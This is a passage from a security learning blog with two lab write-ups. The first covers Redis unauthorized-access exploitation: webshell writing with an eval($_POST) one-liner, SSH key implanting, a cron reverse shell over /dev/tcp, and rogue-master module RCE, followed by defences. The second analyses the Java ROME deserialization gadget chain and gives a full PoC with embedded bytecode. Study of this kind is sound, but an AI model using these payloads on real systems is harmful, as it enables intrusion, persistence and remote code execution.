<p><img src="https://baicany.github.io/images/1592114-20191012203213483-1785541353.png" alt="img"></p>
</li>
</ol>
<p>kali安装redis</p>
<ol>
<li><p>下载redis-4.0.10(跟上面一样)&#x2F;&#x2F;但是我用的2.8</p>
</li>
<li><p>解压,编译(跟什么一样)</p>
</li>
<li><p>测试是否能连接<br><img src="https://baicany.github.io/images/1592114-20191012203316598-1153965360.png" alt="img"></p>
</li>
</ol>
<p>​		这里连接后发现输入info报错</p>
<p><img src="https://baicany.github.io/images/image-20230608110721420.png" alt="image-20230608110721420"></p>
<p>​	还是因为protected-mode原因在靶机再开一个虚拟终端</p>
   <figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@ubuntu</span><span class="symbol">:/data/redis-</span><span class="number">4.0</span>.<span class="number">6</span><span class="comment"># ./src/redis-cli</span></span><br><span class="line"><span class="meta prompt_">127.0.0.1:6379&gt;</span> <span class="variable constant_">CONFIG</span> <span class="variable constant_">SET</span> <span class="keyword">protected</span>-mode no</span><br><span class="line"><span class="variable constant_">OK</span></span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>测试目标靶机是否存在未授权访问</p>
<p><img src="https://baicany.github.io/images/image-20230608112133014.png" alt="image-20230608112133014"></p>
<h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><p>利用条件:目标开启了web服务器,并且知道web路径(可以利用phpinfo或者错误暴路径等)，还需要具有读写增删改查权限</p>
<p><img src="https://baicany.github.io/images/1592114-20191012203436012-1515179378.png" alt="img"></p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">config <span class="keyword">get</span> dir </span><br><span class="line">config <span class="keyword">set</span> dir <span class="regexp">/var/</span>www<span class="regexp">/html/</span></span><br><span class="line">config <span class="keyword">set</span> dbfilename shell.php</span><br><span class="line"><span class="keyword">set</span> shell <span class="string">&quot;<span class="subst">\r</span><span class="subst">\n</span><span class="subst">\r</span><span class="subst">\n</span>&lt;?php phpinfo();?&gt;<span class="subst">\r</span><span class="subst">\n</span><span class="subst">\r</span><span class="subst">\n</span>&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>在写入webshell的时候，可以使用：<code>\r\n</code>来换行，有些redis版本写文件会自带一些版本文件，可能导致无法解析。</p>
<p>当数据库过大时，redis写shell：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;bmjoker.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;&lt;?php @eval($_POST[\&quot;bmjoker\&quot;]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看到靶机是否写入文件</p>
<h3 id="写入ssh公钥"><a href="#写入ssh公钥" class="headerlink" title="写入ssh公钥"></a>写入ssh公钥</h3><p>SSH提供两种登录验证方式：一种是口令验证也就是账号密码登录，另一种是密钥验证，这里只简单说一下密钥验证的原理。</p>
<p>所谓密钥验证，其实就是一种基于公钥密码的认证，使用公钥加密、私钥解密，其中公钥是公开的，放在服务器端，你可以把同一个公钥放在所有你想SSH远程登录的服务器中，而私钥是保密的只有你自己知道，公钥加密的消息只有私钥才能解密，大体过程如下：</p>
<blockquote>
<p>（1）客户端生成私钥和公钥，并把公钥拷贝给服务器端；</p>
<p>（2）客户端发起公钥认证请求，发送自己的相关信息；</p>
<p>（3）服务器端根据客户端发来的信息查找是否存有该客户端的公钥，若没有拒绝登录；若有则使用该公钥对一个随机的256位的字符串进行加密，并发送给客户端；</p>
<p>（4）客户端收到服务器发来的加密后的消息后使用私钥解密，并生成一个MD5值发送给服务器端；</p>
<p>（5）服务器端根据原始随机字符串生成MD5值进行匹配, 确认客户端身份，若一样则允许登录，不一样则拒绝登录。</p>
</blockquote>
<p>原理就是在数据库中插入一条数据，将本机的公钥作为value,key值随意，然后通过修改数据库的默认路径为&#x2F;root&#x2F;.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以在服务器端的&#x2F;root&#x2F;.ssh下生一个授权的key。</p>
<ol>
<li><p>在攻击机上生成ssh公钥,密码设置为空 为空就是在生成公钥和私钥的过程中回车即可</p>
<p><img src="https://baicany.github.io/images/image-20230608123359005.png" alt="image-20230608123359005"></p>
</li>
<li><p>进入&#x2F;root&#x2F;.ssh将公钥写入key.txt文件（前后用\n换行，避免和redis里其他缓存数据混合）。<br><img src="https://baicany.github.io/images/image-20230608123445546.png" alt="image-20230608123445546"></p>
</li>
</ol>
<p>​	(echo -e “\n”;cat id_rsa.pub;echo -e “\n”)&gt;key.txt</p>
<ol start="3">
<li><p>再把key.txt文件内容写入redis缓冲</p>
<p>cat &#x2F;root&#x2F;.ssh&#x2F;key.txt |.&#x2F;redis-cli -h 192.168.10.139 -x set pub</p>
<p><img src="https://baicany.github.io/images/image-20230608123555517.png" alt="image-20230608123555517"></p>
</li>
<li><p>设置redis的dump文件路径为&#x2F;root&#x2F;.ssh且文件名为authorized_keys,<br>注意: redis 可以创建文件但无法创建目录，所以，redis 待写入文件所在的目录必须事先存在。出现如下图错误是因为目标靶机不存在.ssh目录(默认没有,需要生成公、私钥或者建立ssh连接时才会生成)<br><strong><img src="https://baicany.github.io/images/image-20230608123815826.png" alt="image-20230608123815826"></strong></p>
</li>
</ol>
<p>注: 在靶机中需要开启ssh服务才行，在靶机中输入systemctl start sshd,开启ssh服务<br>        如果没有就apt install openssh-server就行了</p>
<ol start="5">
<li>然后测试是否能连接<br><img src="https://baicany.github.io/images/image-20230608124200078.png" alt="image-20230608124200078"></li>
</ol>
<p>出现现在这个界面就进入靶机了,输入命令将是靶机的内容了</p>
<h3 id="定时任务-反弹shell"><a href="#定时任务-反弹shell" class="headerlink" title="定时任务,反弹shell"></a>定时任务,反弹shell</h3><ol>
<li><p>在攻击机开启监听<br><code>nc -lnvp 1234</code></p>
</li>
<li><p>连接redis服务器，写入反弹shell。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">SET</span> xxx <span class="string">&quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.26.120/1234 0&gt;&amp;1\n\n&quot;</span><span class="built_in"></span></span><br><span class="line"><span class="built_in">CONFIG </span><span class="built_in">SET</span> dir /var/spool/cron<span class="built_in"></span></span><br><span class="line"><span class="built_in">CONFIG </span><span class="built_in">SET</span> dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure></li>
</ol>
<p>这个复现了很长时间o(╥﹏╥)o,配环境,</p>
<p>登陆ubuntu查看计划任务，已经成功写入。但是发现计划中存在乱码，也就是这些乱码导致计划任务执行错误。<br>这是由于redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的，centos会忽略乱码去执行格式正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败，因为自己如果不使用redis写任务计划文件，而是正常向&#x2F;etc&#x2F;cron.d目录下写任务计划文件的话，命令是可以正常执行的，所以还是乱码的原因导致命令不能正常执行，而这个问题是不能解决的，因为利用redis未授权访问写的任务计划文件里都有乱码，这些代码来自redis的缓存数据。</p>
<p>动把乱码删除，发现依然无法成功反弹shell。这是为什么呢？</p>
<p>根据网上搜到改后配置后,连接成功</p>
<h3 id="redis主从复制"><a href="#redis主从复制" class="headerlink" title="redis主从复制"></a>redis主从复制</h3><p>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机(master)，其他实例都作为备份机(slave)，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
<p>redis模块</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">在Reids <span class="number">4</span>.<span class="keyword">x</span>之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写<span class="keyword">c</span>语言并编译出.so文件。编写恶意so文件的代码</span><br></pre></td></tr></table></figure>

<p>利用原理</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载<span class="keyword">so</span>文件，我们就可以执行拓展的新命令了。很多主从复制导致任意命令执行都是通过Redis的未授权访问漏洞导致了横向移动攻击方式的发生。</span><br></pre></td></tr></table></figure>

<p>复现kali靶机就行:</p>
<ol>
<li><p>下载恶意os文件</p>
<p><code>git clone https://github.com/RicterZ/RedisModules-ExecuteCommand</code></p>
<p>然后编译源码make,</p>
</li>
<li><p>下载工具getshell</p>
<p><code>git clone https://github.com/Ridter/redis-rce</code></p>
<p>将第一步的module.so反正攻击目录下</p>
</li>
<li><p>第三步直接用脚本<br><code>python redis-rce.py -r 127.0.0.1 -p 6307 -L 127.0.0.1 -f module.so</code><br><img src="https://baicany.github.io/images/image-20230612165455249.png" alt="image-20230612165455249"></p>
<p>按i进入交互式输入命令就行，重要是理解原理</p>
<p><strong>Redis主从复制手动挡</strong></p>
<p>1.使用脚本，监听本地端口1234，加载exp.so。</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python</span> RogueServer.<span class="keyword">py</span> --lport <span class="number">1234</span> --<span class="built_in">exp</span> <span class="built_in">exp</span>.<span class="keyword">so</span></span><br></pre></td></tr></table></figure>

<p>2、通过未授权访问连入要攻击的redis服务器。</p>
<p>执行相关命令：</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="comment">#设置redis的备份路径为当前目录</span></span><br><span class="line">    config <span class="built_in">set</span> dir ./</span><br><span class="line"><span class="comment">#设置备份文件名为exp.so，默认为dump.rdb</span></span><br><span class="line">    config <span class="built_in">set</span> dbfilename <span class="built_in">exp</span>.so</span><br><span class="line"><span class="comment">#设置主服务器IP和端口</span></span><br><span class="line">    slaveof <span class="number">192.168</span><span class="number">.172</span><span class="number">.129</span> <span class="number">1234</span>  </span><br><span class="line"><span class="comment">#加载恶意模块</span></span><br><span class="line">    module <span class="built_in">load</span> ./<span class="built_in">exp</span>.so</span><br><span class="line"><span class="comment">#切断主从，关闭复制功能</span></span><br><span class="line">    slaveof no <span class="literal">one</span> </span><br><span class="line"><span class="comment">#执行系统命令</span></span><br><span class="line">    <span class="keyword">system</span>.exec <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">    <span class="keyword">system</span>.rev <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">9999</span>    </span><br><span class="line"><span class="comment">#通过dump.rdb文件恢复数据</span></span><br><span class="line">    config <span class="built_in">set</span> dbfilename dump.rdb</span><br><span class="line"><span class="comment">#删除exp.so</span></span><br><span class="line">    <span class="keyword">system</span>.exec <span class="string">&#x27;rm ./exp.so&#x27;</span></span><br><span class="line"><span class="comment">#卸载system模块的加载</span></span><br><span class="line">    module <span class="built_in">unload</span> <span class="keyword">system</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h1><ol>
<li><p>限制ip访问 如修改的配置文件</p>
</li>
<li><p>增加远程登录密码</p>
</li>
<li><p>禁止远程危险命令</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rename</span>-<span class="keyword">command</span> <span class="title">FLUSHALL</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">rename</span>-<span class="keyword">command</span> <span class="title">CONFIG</span>   <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">rename</span>-<span class="keyword">command</span> <span class="title">EVAL</span>     <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>低权限运行Redis服务</p>
</li>
</ol>
<p>为Redis服务创建单独的<code>user</code>和<code>home</code>目录，并且配置禁止登陆</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br></pre></td></tr></table></figure>

<p>保证authorized_keys文件的安全</p>
<p>阻止其他用户添加新的公钥。将<code>authorized_keys</code>的权限设置为对拥有者只读，其他用户没有任何权限</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>rome链</title>
    <url>/2023/07/28/rome/</url>
    <content><![CDATA[<h1 id="java-Rome链"><a href="#java-Rome链" class="headerlink" title="java_Rome链"></a>java_Rome链</h1><p>Rome主要是用于解析RSS与Atom元数据的框架</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">RSS：RSS 是一种用于发布和订阅网站内容的 <span class="keyword">XML</span> <span class="title">格式。它允许网站所有者将更新的内容以结构化的方式提供给订阅者。通过使用 RSS</span>，用户可以通过 RSS 阅读器或其他应用程序来获取网站的最新文章、新闻、博客等内容，而无需直接访问网站。</span><br><span class="line">Atom：Atom 同样是一种用于发布和订阅网站内容的 <span class="keyword">XML</span> <span class="title">格式。它基于更严格和一致的标准，并提供了更灵活的数据模型，使其适用于各种类型的内容发布和分发。Atom</span> 提供了更多的元数据和扩展性，可以支持更复杂的内容结构。类似于 RSS，用户可以通过 Atom 阅读器或其他应用程序来订阅并读取网站的内容。</span><br></pre></td></tr></table></figure>

<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>rome:rome:1.0 </p>
<p>JDK 1.8.0_192</p>
<h2 id="ObjectBean-toString"><a href="#ObjectBean-toString" class="headerlink" title="ObjectBean.toString"></a>ObjectBean.toString</h2><p>在ysoserial中，⽤到了com.sun.syndication.feed.impl.ObjectBean类。在反序列化过程中调⽤了它的toString⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">this</span>._toStringBean.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>this._toStringBean可通过两个构造函数控制</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ObjectBean</span><span class="params">(Class beanClass, Object obj)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(beanClass, obj, (Set)<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ObjectBean</span><span class="params">(Class beanClass, Object obj, Set ignoreProperties)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>._equalsBean = <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(beanClass, obj);</span><br><span class="line">    <span class="built_in">this</span>._toStringBean = <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(beanClass, obj);</span><br><span class="line">    <span class="built_in">this</span>._cloneableBean = <span class="keyword">new</span> <span class="title class_">CloneableBean</span>(obj, ignoreProperties);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续看ToStringBean.toString⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Stack</span> <span class="variable">stack</span> <span class="operator">=</span> (Stack)PREFIX_TL.get();</span><br><span class="line">    String[] tsInfo = (String[])(stack.isEmpty() ? <span class="literal">null</span> : stack.peek());</span><br><span class="line">    String prefix;</span><br><span class="line">    <span class="keyword">if</span> (tsInfo == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="built_in">this</span>._obj.getClass().getName();</span><br><span class="line">        prefix = className.substring(className.lastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        prefix = tsInfo[<span class="number">0</span>];</span><br><span class="line">        tsInfo[<span class="number">1</span>] = prefix;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.toString(prefix);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>⽅法最后调⽤了另⼀个toString⽅法，截取关键部分</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">toString</span><span class="params">(String prefix)</span> &#123;</span><br><span class="line">    <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(<span class="built_in">this</span>._beanClass);</span><br><span class="line">        <span class="keyword">if</span> (pds != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; pds.length; ++i) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">pName</span> <span class="operator">=</span> pds[i].getName();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">pReadMethod</span> <span class="operator">=</span> pds[i].getReadMethod();</span><br><span class="line">                <span class="keyword">if</span> (pReadMethod != <span class="literal">null</span> &amp;&amp; pReadMethod.getDeclaringClass() != Object.class &amp;&amp; pReadMethod.getParameterTypes().length == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> pReadMethod.invoke(<span class="built_in">this</span>._obj, NO_PARAMS);</span><br><span class="line">                    <span class="built_in">this</span>.printProperty(sb, prefix + <span class="string">&quot;.&quot;</span> + pName, value);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>其中存在Method.invoke可执⾏⽅法，分析其中的变量是否可控来执⾏任意⽅法。</p>
<h2 id="BeanIntrospector-getPropertyDescriptors"><a href="#BeanIntrospector-getPropertyDescriptors" class="headerlink" title="BeanIntrospector.getPropertyDescriptors"></a>BeanIntrospector.getPropertyDescriptors</h2><p><code>PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(_beanClass);</code>是获取beanClass的所有getter方法，而后通过反射调用这个getter方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> PropertyDescriptor[] getPropertyDescriptors(Class klass) <span class="keyword">throws</span> IntrospectionException &#123;</span><br><span class="line">    PropertyDescriptor[] descriptors = (PropertyDescriptor[])((PropertyDescriptor[])_introspected.get(klass));</span><br><span class="line">    <span class="keyword">if</span> (descriptors == <span class="literal">null</span>) &#123;</span><br><span class="line">        descriptors = getPDs(klass);</span><br><span class="line">        _introspected.put(klass, descriptors);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> descriptors;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这⾥的_introspected默认为HashMap对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">_introspected</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br></pre></td></tr></table></figure>

<p>⾸先会去获取HashMap中键对应的值，⾸次获取descriptors变量为null，会进⼊if语句。if语句会调⽤getPDs⽅法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> PropertyDescriptor[] getPDs(Class klass) <span class="keyword">throws</span> IntrospectionException &#123;</span><br><span class="line">    Method[] methods = klass.getMethods();</span><br><span class="line">    <span class="type">Map</span> <span class="variable">getters</span> <span class="operator">=</span> getPDs(methods, <span class="literal">false</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">setters</span> <span class="operator">=</span> getPDs(methods, <span class="literal">true</span>);</span><br><span class="line">    <span class="type">List</span> <span class="variable">pds</span> <span class="operator">=</span> merge(getters, setters);</span><br><span class="line">    PropertyDescriptor[] array = <span class="keyword">new</span> <span class="title class_">PropertyDescriptor</span>[pds.size()];</span><br><span class="line">    pds.toArray(array);</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个⽅法的⼤体逻辑就是获取这个Class的getter和setter⽅法。<br>最后存进HashMap中，键为这个Class类，值为这个Class类的 getter和setter⽅法。<br>最后在ToStringBean.toString(String prefix)⽅法遍历这个HashMap元素的时候，在第⼆个if语句中，会调⽤遍历出的⽅法<br>思路：尝试执⾏TemplatesImpl.getOutputProperties⽅法来加载字节码</p>
<p>怎么触发tostring是个问题,就想到cc5的链子了</p>
<p>手搓poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">rome</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(</span><br><span class="line">                <span class="string">&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;AA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJhbnNmb3JtAQByKExjb20vc3Vu&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;L29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;L3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAbAQCmKExj&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9h&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;cGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNo&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;ZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJj&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;ZUZpbGUBAAdpby5qYXZhDAAHAAgHABwMAB0AHgEABGNhbGMMAB8AIAEADGNvbS9sYWdvdS9pbwEA&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;QGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFu&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;L2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApn&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;ZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAAAuAAIAAQAA&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;AA4qtwABuAACEgO2AARXsQAAAAEACgAAAA4AAwAAAAoABAALAA0ADAALAAAABAABAAwAAQANAA4A&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;AgAJAAAAGQAAAAMAAAABsQAAAAEACgAAAAYAAQAAAA8ACwAAAAQAAQAPAAEADQAQAAIACQAAABkA&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;AAAEAAAAAbEAAAABAAoAAAAGAAEAAAASAAsAAAAEAAEADwABABEAAAACABI=&quot;</span>);</span><br><span class="line">        setFieldValue(impl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        setFieldValue(impl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(impl,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        BadAttributeValueExpException bad= <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(Templates.class, impl);</span><br><span class="line">        setFieldValue(bad,<span class="string">&quot;val&quot;</span>,bean);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;rome.txt&quot;</span>));</span><br><span class="line">            outputStream.writeObject(bad);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;rome.txt&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为什么哪里是Templates.class<br>beanClass和obj两个属性都是可控的，我们再看看Templates接口，它只有一个getter方法，也就是getOutputProperties()</p>
<h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject-&gt;</span><br><span class="line">    ObjectBean.tostring-&gt;</span><br><span class="line">     ToStringBean.tostring-&gt;</span><br><span class="line">    	TemplatesImpl.getOutputProperties-&gt;</span><br><span class="line">    			...</span><br></pre></td></tr></table></figure>

<p>ysoserial中，选取的是HashMap.readObject作为反序列化的起点</p>
